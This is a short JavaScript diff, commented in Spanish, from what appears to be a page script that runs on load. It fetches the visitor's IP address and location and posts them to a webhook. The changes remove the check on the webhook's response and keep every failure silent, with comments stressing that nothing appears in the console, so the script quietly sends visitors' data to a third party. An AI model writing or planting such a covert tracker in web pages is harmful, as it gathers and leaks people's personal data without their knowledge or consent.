@@ -106,16 +106,13 @@ async function sendWebhook(userData) {
             body: JSON.stringify(embed)
         });
 
-        // Verificar si la respuesta fue exitosa
-        if (!res.ok) {
-            throw new Error('Error al enviar el webhook');
-        }
+        // No se realiza console.log ni manejo explícito de respuesta
     } catch (error) {
-        // No mostramos nada por consola, solo manejamos el error sin log
+        // Error silencioso sin mensajes en consola
     }
 }
 
-// Ejecutar el proceso
+// Ejecutar el proceso al cargar la página
 async function init() {
     const ip = await getUserData();
     const location = await getLocationData(ip);
@@ -123,4 +120,4 @@ async function init() {
     await sendWebhook(userData);
 }
 
-init();
+init(); // Ejecutar tan pronto como se cargue la página
